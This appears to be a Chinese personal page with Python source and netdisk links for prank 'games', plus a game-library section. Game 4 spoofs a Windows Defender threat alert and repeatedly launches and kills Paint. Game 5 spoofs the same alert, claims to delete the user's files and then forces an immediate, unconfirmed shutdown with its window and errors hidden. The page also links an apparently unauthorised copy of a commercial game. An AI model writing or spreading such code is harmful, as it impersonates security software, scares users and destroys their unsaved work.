    current_win_x = INIT_WIN_X  # 窗口当前X坐标（初始居中）
    shake_phase = 0             # 后期抖动相位
    phase_shake_counter = 0     # 前期抖动计数器

# 初始化游戏
init_game_variables()

# ===================== 辅助函数 =====================
def draw_text(text, font, color, surface, x, y):
    """绘制文字的辅助函数"""
    text_obj = font.render(text, True, color)
    text_rect = text_obj.get_rect(center=(x, y))
    surface.blit(text_obj, text_rect)

def window_move_effect(remaining_time):
    """分阶段窗口移动效果：前70秒简单抖动，最后20秒绕屏跑步"""
    global current_win_x, shake_phase, phase_shake_counter, move_offset_x, move_offset_y
    
    if remaining_time <= FINAL_PHASE_TIME:
        # 最后20秒：绕屏跑步 + 叠加抖动
        # 1. 基础绕屏跑步：向右移动，超出范围后从左侧回归
        current_win_x += RUN_SPEED
        if current_win_x > SCREEN_WIDTH + RUN_RANGE - WINDOW_WIDTH:
            current_win_x = INIT_WIN_X - RUN_RANGE  # 从左侧外开始回归
        
        # 2. 叠加快速小抖动
        shake_phase += FINAL_SHAKE_FREQUENCY
        shake_x = math.sin(shake_phase) * FINAL_SHAKE_INTENSITY
        shake_y = math.cos(shake_phase * 1.5) * FINAL_SHAKE_INTENSITY
        
        # 最终窗口位置
        final_x = current_win_x + shake_x
        final_y = INIT_WIN_Y + shake_y
    else:
        # 前70秒：简单随机抖动（无绕屏）
        phase_shake_counter += 1
        # 正弦曲线实现平滑的简单抖动
        shake_x = math.sin(phase_shake_counter * 0.05) * SHAKE_AMPLITUDE
        shake_y = math.cos(phase_shake_counter * 0.07) * SHAKE_AMPLITUDE
        
        # 窗口保持在居中位置附近抖动
        final_x = INIT_WIN_X + shake_x
        final_y = INIT_WIN_Y + shake_y
    
    # 应用到窗口/画面
    if WINDOW_AVAILABLE:
        window.position = (int(final_x), int(final_y))
    else:
        # 旧版本：计算相对偏移量
        move_offset_x = int(final_x - INIT_WIN_X)
        move_offset_y = int(final_y - INIT_WIN_Y)

def format_time(seconds):
    """格式化时间为 MM:SS 格式"""
    mins = seconds // 60
    secs = seconds % 60
    return f"{int(mins)}:{int(secs):02d}"

# ===================== 游戏主循环 =====================
running = True
while running:
    clock.tick(FPS)
    
    # 计算剩余时间
    elapsed_time = time.time() - start_time
    remaining_time = max(0, TIME_LIMIT - elapsed_time)
    
    # 游戏结束判定（通关分数改为80分）
    if not game_over:
        if score >= WIN_SCORE:
            game_over = True
            win = True
            pygame.time.delay(1000)
            running = False
        elif remaining_time <= 0:
            game_over = True
            win = False
            pygame.time.delay(1000)
            init_game_variables()
    
    # 事件处理
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False
        # 按ESC退出
        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_ESCAPE:
                running = False
        
        # 鼠标点击得分
        if event.type == pygame.MOUSEBUTTONDOWN and not game_over:
            mouse_x, mouse_y = pygame.mouse.get_pos()
            # 修正偏移的点击判定
            click_x = mouse_x - move_offset_x if not WINDOW_AVAILABLE else mouse_x
            click_y = mouse_y - move_offset_y if not WINDOW_AVAILABLE else mouse_y
            
            if (target_x - TARGET_SIZE//2 < click_x < target_x + TARGET_SIZE//2 and
                target_y - TARGET_SIZE//2 < click_y < target_y + TARGET_SIZE//2):
                score += BASE_SCORE
                # 随机更换目标位置
                target_x = random.randint(TARGET_SIZE//2, WINDOW_WIDTH - TARGET_SIZE//2)
                target_y = random.randint(TARGET_SIZE//2, WINDOW_HEIGHT - TARGET_SIZE//2)
    
    # 运行分阶段窗口移动效果（仅游戏中）
    if not game_over:
        window_move_effect(remaining_time)
    
    # 绘制画面
    screen.fill(WHITE)
    
    if not game_over:
        # 绘制目标（修正偏移）
        draw_x = target_x + move_offset_x if not WINDOW_AVAILABLE else target_x
        draw_y = target_y + move_offset_y if not WINDOW_AVAILABLE else target_y
        pygame.draw.circle(screen, RED, (draw_x, draw_y), TARGET_SIZE//2)
        
        # 绘制UI（更新通关目标为80分）
        draw_text(f"分数: {score}", font_medium, BLACK, screen, WINDOW_WIDTH//4, 40)
        draw_text(f"时间: {format_time(remaining_time)}", font_medium, BLACK, screen, 3*WINDOW_WIDTH//4, 40)
        draw_text(f"目标: {WIN_SCORE}分", font_small, BLACK, screen, WINDOW_WIDTH//2, WINDOW_HEIGHT - 30)
        
        # 提示最后阶段
        if remaining_time <= FINAL_PHASE_TIME:
            draw_text("NONONO!", font_small, RED, screen, WINDOW_WIDTH//2, 80)
    else:
        # 失败界面
        if not win:
            draw_text("时间到!", font_large, RED, screen, WINDOW_WIDTH//2, WINDOW_HEIGHT//3)
            draw_text(f"最终分数: {score}", font_medium, BLACK, screen, WINDOW_WIDTH//2, WINDOW_HEIGHT//2)
            draw_text("即将重新开始...", font_small, BLACK, screen, WINDOW_WIDTH//2, 2*WINDOW_HEIGHT//3)
    
    pygame.display.flip()

# ===================== 游戏结束 ==========
input("NO")
input("WE ONLY 2 GAMES!")
input("hu----")
input("GAME4 IS DIFFCULT!")
a=input("你想玩吗Y/N")
if a=="N":
    input("ANDDDDDDDDDDDDDDDDDDDDD,WEEE")
    input("WHAT?")
    input("CMD:del all")
    input("ERROR:404 服务器未找到")
    input("BAD END 1 服务器丢失")
    input("GAME OVER")
else:
    input("GAME 4 START")
    input("PAINT PICTURE IS FUN")
    input("LET US PLAY!")
    input("SEE YOU IN GAME 4!")
    input("OUT THERE!")


```



#                                                     

game4

```
input("HELLO THERE")
input("WELCOME TO GAME 4")
# 弹出Windows系统通知（还原示例样式）
from plyer import notification
import time

# 弹出Windows系统原生通知（适配Python 3.11+）
notification.notify(
    title="病毒和威胁防护",  # 通知标题
    message="发现威胁",  # 通知内容
    app_name="Windows Defender",  # 应用名称（显示在通知栏）
    timeout=10  # 通知显示时长（秒）
)

# 等待通知显示（可选）
time.sleep(5)
input("I KNOW YOUR PC DO WHAT")
input("THAT NOTICE")
input("BUT DON'T BE AFRAID")
input("GAME 4 COMING!!!")
#画图   
import subprocess
import os
import time
import psutil

def is_mspaint_running():
    """检查画图应用是否正在运行"""
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] == "mspaint.exe":
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return False

def open_mspaint_app():
    """打开画图应用"""
    mspaint_path = "mspaint.exe"
    subprocess.run(f'start "" "{mspaint_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

def close_mspaint_app():
    """彻底关闭画图应用的所有相关进程"""
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] == "mspaint.exe":
                proc.terminate()
                # 等待进程终止（最多2秒），未终止则强制杀死
                gone, alive = psutil.wait_procs([proc], timeout=2)
                if alive:
                    proc.kill()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

if os.name == 'nt':
    # 初始打开画图应用
    open_mspaint_app()
    
    # 等待15秒，期间检测画图状态，关闭则重新打开
    total_wait_time = 15
    check_interval = 0.5
    elapsed_time = 0
    
    while elapsed_time < total_wait_time:
        if not is_mspaint_running():
            open_mspaint_app()
        time.sleep(check_interval)
        elapsed_time += check_interval
    
    # 15秒时长到，强制关闭画图
    if is_mspaint_running():
        close_mspaint_app()
        # 二次检查防止重启
        time.sleep(1)
        if is_mspaint_running():
            close_mspaint_app()  
input("GREAT JOB")
input("SEE YOU NEXT TIME!")
```

game5

```
input("THIS IS THE LAST GAME")
input("CMD:del computer files")
# 弹出Windows系统通知（还原示例样式）
from plyer import notification
import time

# 弹出Windows系统原生通知（适配Python 3.11+）
notification.notify(
    title="病毒和威胁防护",  # 通知标题
    message="发现威胁",  # 通知内容
    app_name="Windows Defender",  # 应用名称（显示在通知栏）
    timeout=10  # 通知显示时长（秒）
)

# 等待通知显示（可选）
time.sleep(5)
input("I DEL YOUR COMPUTER FILES")
input("youuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu")
input("BAD END 2 作弊")
import os
import platform
import subprocess

def force_shutdown_immediately():
    """
    无警告、无确认 瞬间强制关机（极度危险！）
    """
    system = platform.system()
    try:
        if system == "Windows":
            # Windows 无提示强制瞬间关机
            subprocess.run(
                ["shutdown", "/s", "/f", "/t", "0"],
                check=True,
                creationflags=subprocess.CREATE_NO_WINDOW,  # 隐藏命令行窗口
                stdout=subprocess.DEVNULL,  # 屏蔽输出
                stderr=subprocess.DEVNULL   # 屏蔽错误提示
            )
        elif system == "Darwin":  # macOS
            # macOS 强制关机（仍需sudo密码，系统机制无法绕过）
            subprocess.run(
                ["sudo", "shutdown", "-h", "now"],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        elif system == "Linux":
            # Linux 强制关机（仍需sudo密码）
            subprocess.run(
                ["sudo", "shutdown", "-h", "now"],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
    except:
        # 屏蔽所有错误提示
        pass

# 直接执行关机（无任何提示/确认）
force_shutdown_immediately()
```

> [!WARNING]
>
> 禁止随意转载或商用

通过网盘分享的文件：a dmin(1.0.0)Chinese这破游戏终于完工了 

链接: https://pan.baidu.com/s/1eGfV0PIjil2Jthd0O5LLqA 提取码: mawa

通过网盘分享的文件：a dmin(1.0.1)Chinese 、

链接: https://pan.baidu.com/s/1QPMX-19LSD-aCKC7tWrteA 提取码: mawa

通过网盘分享的文件：a dmin(2.0.0)Chinese 

链接: https://pan.baidu.com/s/1cDB_Y4hrZO1o1jILjJEGQw 提取码: mawa

通过网盘分享的文件：a dmin(3.0.0)Chinese  beta

链接: https://pan.baidu.com/s/1Nk4iKB_ov_eRxX4_wAh9tw 提取码: mawa







# 我的游戏库，随时更新

## 声明必看

作为一名中华人民共和国的公民，我们应当自觉遵守国家法律法规，坚决维护知识产权，尊重每一位创作者的劳动成果。

根据《中华人民共和国刑法》第217条及其他相关法律法规，未经软件著作权人许可，任何形式的复制、发行行为均不受法律保护，也无法通过附加免责声明使其合法化。“仅供学习使用”、“限时删除”等表述，并不能改变未经授权传播行为的侵权性质，更不能成为免除法律责任的依据。我们呼吁广大网民自觉抵制任何形式的盗版行为。

体验游戏的乐趣应当建立在合法的基础之上。我们鼓励大家通过Steam、WeGame等官方授权平台购买正版游戏，这不仅是对开发者的支持，也能获得完整的游戏体验、持续的更新服务和安全的网络环境。共同维护健康有序的网络空间和文化市场，是每一位公民应尽的责任。

## 节奏医生

> [!WARNING]
>
> 下载后24小时请后删除，想玩请尊重原版

通过网盘分享的文件：Rhythm Doctor 

链接: https://pan.baidu.com/s/1hLWiNi6HfkpYZUrcEgXe1g 提取码: mawa

# 网站更新日志

## 网站上线1.0.0

更新内容：欢迎来到新世界！

1.小程序

## 网站上线2.0.0

更新内容：1.开源代码

## 网站上线2.1.0

更新内容：优化排版

## 网站上线3.0.0

更新内容：完全更新排版（重写）

通过网盘分享的文件：网站更新日志3.0.0.txt 

链接: https://pan.baidu.com/s/1-Xv1tovWdwPZNlm5K5UvXQ?pwd=lmlm 提取码: lmlm

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>现代俄罗斯方块</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">

​    





























































































































































































































